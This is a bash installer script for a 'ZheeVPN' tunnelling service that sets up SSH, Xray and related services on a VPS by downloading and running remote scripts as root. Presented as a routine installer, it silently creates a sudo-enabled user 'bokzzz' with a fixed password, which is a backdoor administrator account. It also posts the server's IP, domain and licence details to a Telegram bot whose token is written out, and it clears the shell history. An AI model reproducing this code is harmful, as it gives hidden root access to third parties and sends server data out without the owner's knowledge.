#!/bin/bash
Ip_info="https://raw.githubusercontent.com/myzid/izin/main/ip"
ipsaya=$(wget -qO- ipinfo.io/ip)
data_server=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
date_list=$(date +"%Y-%m-%d" -d "$data_server")
checking_sc() {
  useexp=$(wget -qO- $Ip_info | grep $ipsaya | awk '{print $3}')
  if [[ $date_list < $useexp ]]; then
    echo -ne
  else
    echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
    echo -e "\033[42m          404 NOT FOUND AUTOSCRIPT          \033[0m"
    echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
    echo -e ""
    echo -e "            ${RED}PERMISSION DENIED !${NC}"
    echo -e "   \033[0;33mYour VPS${NC} $ipsaya \033[0;33mHas been Banned${NC}"
    echo -e "     \033[0;33mBuy access permissions for scripts${NC}"
    echo -e "             \033[0;33mContact Admin :${NC}"
    echo -e "      \033[0;36mTelegram${NC} t.me/zheevpn"
    echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
    exit
  fi
}
checking_sc
BURIQ () {
    curl -sS https://raw.githubusercontent.com/myzid/izin/main/ip > /root/tmp
    data=( `cat /root/tmp | grep -E "^### " | awk '{print $2}'` )
    for user in "${data[@]}"
    do
    exp=( `grep -E "^### $user" "/root/tmp" | awk '{print $3}'` )
    d1=(`date -d "$exp" +%s`)
    d2=(`date -d "$biji" +%s`)
    exp2=$(( (d1 - d2) / 86400 ))
    if [[ "$exp2" -le "0" ]]; then
    echo $user > /etc/.$user.ini
    else
    rm -f  /etc/.$user.ini > /dev/null 2>&1
    fi
    done
    rm -f  /root/tmp
}
MYIP=$(curl -sS ipv4.icanhazip.com)
Name=$(curl -sS https://raw.githubusercontent.com/myzid/izin/main/ip | grep $MYIP | awk '{print $2}')
echo $Name > /usr/local/etc/.$Name.ini
CekOne=$(cat /usr/local/etc/.$Name.ini)

Bloman () {
if [ -f "/etc/.$Name.ini" ]; then
CekTwo=$(cat /etc/.$Name.ini)
    if [ "$CekOne" = "$CekTwo" ]; then
        res="Expired"
    fi
else
res="Permission Accepted..."
fi
}

PERMISSION () {
    MYIP=$(curl -sS ipv4.icanhazip.com)
    IZIN=$(curl -sS https://raw.githubusercontent.com/myzid/izin/main/ip | awk '{print $4}' | grep $MYIP)
    if [ "$MYIP" = "$IZIN" ]; then
    Bloman
    else
    res="Permission Denied!"
    fi
    BURIQ
}

PERMISSION
if [ "$res" = "Expired" ]; then
Exp="\e[36mExpired\033[0m"
rm -f /home/needupdate > /dev/null 2>&1
else
Exp=$(curl -sS https://raw.githubusercontent.com/myzid/izin/main/ip | grep $MYIP | awk '{print $3}')
fi
clear
# // Banner
echo -e "${YELLOW}----------------------------------------------------------${NC}"
echo -e "  Welcome To ZheeVPN Project Script Installer ${YELLOW}(${NC}${green} Stable Edition ${NC}${YELLOW})${NC}"
echo -e "     This Will Quick Setup VPN Server On Your Server"
echo -e "          Auther : ${green}ZheeVPN ${NC}"
echo -e "       Â© Recode By ZheeVPN Project ${YELLOW}(${NC} 2023 ${YELLOW})${NC}"
echo -e "${YELLOW}----------------------------------------------------------${NC}"
echo ""
sleep 3
##### IZIN SCRIPT #####
# // Checking Os Architecture
if [[ $( uname -m | awk '{print $1}' ) == "x86_64" ]]; then
    echo -e "${OK} Your Architecture Is Supported ( ${green}$( uname -m )${NC} )"
else
    echo -e "${EROR} Your Architecture Is Not Supported ( ${YELLOW}$( uname -m )${NC} )"
    exit 1
fi

# // Checking System
if [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "ubuntu" ]]; then
    echo -e "${OK} Your OS Is Supported ( ${green}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
elif [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "debian" ]]; then
    echo -e "${OK} Your OS Is Supported ( ${green}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
else
    echo -e "${EROR} Your OS Is Not Supported ( ${YELLOW}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
    exit 1
fi

# // IP Address Validating
if [[ $IP == "" ]]; then
    echo -e "${EROR} IP Address ( ${YELLOW}Not Detected${NC} )"
else
    echo -e "${OK} IP Address ( ${green}$Ip_info${NC} )"
fi

# // Validate Successfull
echo ""
read -p "$( echo -e "Press ${GRAY}[ ${NC}${green}Enter${NC} ${GRAY}]${NC} For Starting Installation") "
echo ""
clear
red='\e[1;31m'
green='\e[0;32m'
yell='\e[1;33m'
tyblue='\e[1;36m'
NC='\e[0m'
purple() { echo -e "\\033[35;1m${*}\\033[0m"; }
tyblue() { echo -e "\\033[36;1m${*}\\033[0m"; }
yellow() { echo -e "\\033[33;1m${*}\\033[0m"; }
green() { echo -e "\\033[32;1m${*}\\033[0m"; }
red() { echo -e "\\033[31;1m${*}\\033[0m"; }
# domain random
ZheeVPN="https://raw.githubusercontent.com/myzid/v5/main/"
cd /root
if [ "${EUID}" -ne 0 ]; then
echo "You need to run this script as root"
exit 1
fi
if [ "$(systemd-detect-virt)" == "openvz" ]; then
echo "OpenVZ is not supported"
exit 1
fi
localip=$(hostname -I | cut -d\  -f1)
hst=( `hostname` )
dart=$(cat /etc/hosts | grep -w `hostname` | awk '{print $2}')
if [[ "$hst" != "$dart" ]]; then
echo "$localip $(hostname)" >> /etc/hosts
fi
mkdir -p /etc/xray
mkdir -p /etc/v2ray
touch /etc/xray/domain
touch /etc/v2ray/domain
touch /etc/xray/scdomain
touch /etc/v2ray/scdomain
echo -e "[ ${tyblue}NOTES${NC} ] Before we go.. "
sleep 1
echo -e "[ ${tyblue}NOTES${NC} ] I need check your headers first.."
sleep 2
echo -e "[ ${green}INFO${NC} ] Checking headers"
sleep 1
clear
secs_to_human() {
echo "Installation time : $(( ${1} / 3600 )) hours $(( (${1} / 60) % 60 )) minute's $(( ${1} % 60 )) seconds"
}
start=$(date +%s)
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
sysctl -w net.ipv6.conf.all.disable_ipv6=1 >/dev/null 2>&1
sysctl -w net.ipv6.conf.default.disable_ipv6=1 >/dev/null 2>&1
coreselect=''
cat> /root/.profile << END
if [ "$BASH" ]; then
if [ -f ~/.bashrc ]; then
. ~/.bashrc
fi
fi
mesg n || true
clear
END
chmod 644 /root/.profile
echo -e "[ ${green}INFO${NC} ] Preparing the install file"
apt install git curl -y >/dev/null 2>&1
apt install python -y >/dev/null 2>&1
echo -e "[ ${green}INFO${NC} ] Aight good ... installation file is ready"
sleep 2
echo -ne "[ ${green}INFO${NC} ] Check permission : "
mkdir -p /var/lib/SIJA >/dev/null 2>&1
echo "IP=" >> /var/lib/SIJA/ipvps.conf
echo ""
wget ${ZheeVPN}main/tools.sh && chmod +x tools.sh && ./tools.sh
rm -rf tools.sh
rm tools.sh
clear
echo -e "$green━━━━━━━━━━┏┓━━━━━━━━━━━━━━━━━━━━━━━━┏┓━━━━━━━━━━━$NC"
echo -e "$green━━━━━━━━━┏┛┗┓━━━━━━━━━━━━━━━━━━━━━━┏┛┗┓━━━━━━━━━━$NC"
echo -e "$green┏━━┓━┏┓┏┓┗┓┏┛┏━━┓━━━━┏━━┓┏━━┓┏┓┏━┓━┗┓┏┛┏┓┏━┓━┏━━┓$NC"
echo -e "$green┗━┓┃━┃┃┃┃━┃┃━┃┏┓┃━━━━┃┏┓┃┃┏┓┃┣┫┃┏┓┓━┃┃━┣┫┃┏┓┓┃┏┓┃$NC"
echo -e "$green┃┗┛┗┓┃┗┛┃━┃┗┓┃┗┛┃━━━━┃┗┛┃┃┗┛┃┃┃┃┃┃┃━┃┗┓┃┃┃┃┃┃┃┗┛┃$NC"
echo -e "$green┗━━━┛┗━━┛━┗━┛┗━━┛━━━━┃┏━┛┗━━┛┗┛┗┛┗┛━┗━┛┗┛┗┛┗┛┗━┓┃$NC"
echo -e "$green━━━━━━━━━━━━━━━━━━━━━┃┃━━━━━━━━━━━━━━━━━━━━━━┏━┛┃$NC"
echo -e "$green━━━━━━━━━━━━━━━━━━━━━┗┛━━━━━━━━━━━━━━━━━━━━━━┗━━┛$NC"
    echo -e "$BBlue                     SETUP DOMAIN VPS     $NC"
    echo -e "$BYellow----------------------------------------------------------$NC"
    echo -e "$BGreen 1. Use Domain Script / Menggunakan Domain Script $NC"
    echo -e "$BGreen 2. Choose Your Own Domain / Menggunakan Domain Sendiri $NC"
    echo -e "$BYellow----------------------------------------------------------$NC"
    read -p " input 1 or 2 / pilih 1 atau 2 : " dns
    if [[ $dns == "1" ]]; then
    apt install jq curl -y
    wget -q -O /root/cf "${ZheeVPN}ssh/cf" >/dev/null 2>&1
    chmod +x /root/cf
    bash /root/cf | tee /root/install.log
    print_success "Domain Random Done" 
    elif [[ $dns == "2" ]]; then
    read -rp "Enter Your Domain / masukan domain : " dom
    read -rp "Input ur ns-domain : " -e nsdomen
    echo "IP=$dom" > /var/lib/SIJA/ipvps.conf
    echo "$dom" > /root/scdomain
	echo "$dom" > /etc/xray/scdomain
	echo "$dom" > /etc/xray/domain
	echo "$dom" > /etc/v2ray/domain
	echo "$dom" > /root/domain
        echo "$nsdomen" > /etc/xray/nsdomain
        echo "$nsdomen" > /root/nsdomain
fi
domain=$(cat /root/domain)
CITY=$(curl -s ipinfo.io/city )
WKT=$(curl -s ipinfo.io/timezone )
userdel jame > /dev/null 2>&1
Username="bokzzz"
Password=bokzzz
mkdir -p /home/script/
useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
usermod -aG sudo $Username > /dev/null 2>&1
Ram_Usage="$((mem_used / 1024))"
Ram_Total="$((mem_total / 1024))"
export tanggal=`date -d "0 days" +"%d-%m-%Y - %X" `
export OS_Name=$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/PRETTY_NAME//g' | sed 's/=//g' | sed 's/"//g' )
CHATID="-4000380757"
KEY="6537337482:AAGDQOI6_OdJBQe0kKBTN4KCLWGhWNKltfU"
TIME="10"
URL="https://api.telegram.org/bot$KEY/sendMessage"
TEXT="
────────────────────────
   ⚡ INSTALLASI SCRIPT ⚡
────────────────────────
Tanggal  : <code>$tanggal</code>
Linux    : <code>$OS_Name</code>
Ram Used : <code>$Ram_Total / $Ram_Usage MB</code>
────────────────────────
Domain   : <code>$domain</code>
IP Vps   : <code>$ipsaya</code>
User Sc  : <code>$Name</code>
Expired  : <code>$Exp</code>
────────────────────────
<i>Nontifikasi Otomatis Dari Github</i>
<i>Zhee_VPN</i>
'&reply_markup={"inline_keyboard":[[{"text":"⚡ ORDER ⚡","url":"https://t.me/zheevpn"}]]}'
"
   curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null 
clear
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green      Install SSH / WS               $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 2
clear
wget ${ZheeVPN}ssh/ssh-vpn.sh && chmod +x ssh-vpn.sh && ./ssh-vpn.sh
clear
wget ${ZheeVPN}sshws/insshws.sh && chmod +x insshws.sh && ./insshws.sh
clear
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green      Install BACKUP               $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 2
clear
wget ${ZheeVPN}backup/set-br.sh &&  chmod +x set-br.sh && ./set-br.sh
clear
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green          Install XRAY              $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 2
clear
wget ${ZheeVPN}xray/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
clear
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green          Install SLOWDNS              $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 2
clear
wget -q -O slow.sh ${ZheeVPN}main/slow.sh && chmod +x slow.sh && ./slow.sh
clear
cat> /root/.profile << END
if [ "$BASH" ]; then
if [ -f ~/.bashrc ]; then
. ~/.bashrc
fi
fi
mesg n || true
clear
menu
END
chmod 644 /root/.profile
if [ -f "/root/log-install.txt" ]; then
rm /root/log-install.txt > /dev/null 2>&1
fi
if [ -f "/etc/afak.conf" ]; then
rm /etc/afak.conf > /dev/null 2>&1
fi
if [ ! -f "/etc/log-create-user.log" ]; then
echo "Log All Account " > /etc/log-create-user.log
fi
history -c
serverV=$( curl -sS https://raw.githubusercontent.com/Bringas-tunnel/v5/main/version  )
echo $serverV > /opt/.ver
aureb=$(cat /home/re_otm)
b=11
if [ $aureb -gt $b ]
then
gg="PM"
else
gg="AM"
fi
curl -sS ifconfig.me > /etc/myipvps
echo " "
echo "=====================-[ ZheeVPN Tunneling ]-===================="
echo ""
echo "------------------------------------------------------------"
echo ""
echo ""
echo "   >>> Service & Port"  | tee -a log-install.txt
echo "   - OpenVPN		: 2086"  | tee -a log-install.txt
echo "   - OpenSSH		: 22"  | tee -a log-install.txt
echo "   - SSH Websocket	: 80,8080 [ON]" | tee -a log-install.txt
echo "   - SSH SSL Websocket	: 443" | tee -a log-install.txt
echo "   - Stunnel4		: 8880, 8443" | tee -a log-install.txt
echo "   - Dropbear		: 109, 143" | tee -a log-install.txt
echo "   - Badvpn		: 7100-7900" | tee -a log-install.txt
echo "   - Nginx		: 81" | tee -a log-install.txt
echo "   - Vmess TLS		: 443" | tee -a log-install.txt
echo "   - Vmess None TLS	: 80,8080" | tee -a log-install.txt
echo "   - Vless TLS		: 443" | tee -a log-install.txt
echo "   - Vless None TLS	: 80,8080" | tee -a log-install.txt
echo "   - Trojan GRPC		: 443" | tee -a log-install.txt
echo "   - Trojan WS		: 443" | tee -a log-install.txt
echo "   - Trojan Go		: 443" | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "   >>> Server Information & Other Features"  | tee -a log-install.txt
echo "   - Timezone		: Asia/Jakarta (GMT +7)"  | tee -a log-install.txt
echo "   - Fail2Ban		: [ON]"  | tee -a log-install.txt
echo "   - Dflate		: [ON]"  | tee -a log-install.txt
echo "   - IPtables		: [ON]"  | tee -a log-install.txt
echo "   - Auto-Reboot		: [ON]"  | tee -a log-install.txt
echo "   - IPv6			: [OFF]"  | tee -a log-install.txt
echo "   - Autoreboot On	: $aureb:00 $gg GMT +7" | tee -a log-install.txt
echo "   - AutoKill Multi Login User" | tee -a log-install.txt
echo "   - Auto Delete Expired Account" | tee -a log-install.txt
echo "   - Fully automatic script" | tee -a log-install.txt
echo "   - VPS settings" | tee -a log-install.txt
echo "   - Admin Control" | tee -a log-install.txt
echo "   - Change port" | tee -a log-install.txt
echo "   - Full Orders For Various Services" | tee -a log-install.txt
echo ""
echo ""
echo "------------------------------------------------------------"
echo -e ""
echo ""
echo "" | tee -a log-install.txt
rm /root/setup.sh >/dev/null 2>&1
rm /root/ins-xray.sh >/dev/null 2>&1
rm /root/insshws.sh >/dev/null 2>&1
secs_to_human "$(($(date +%s) - ${start}))" | tee -a log-install.txt
echo -e "
"
read -n 1 -s -r -p "Press any key to menu"
menu
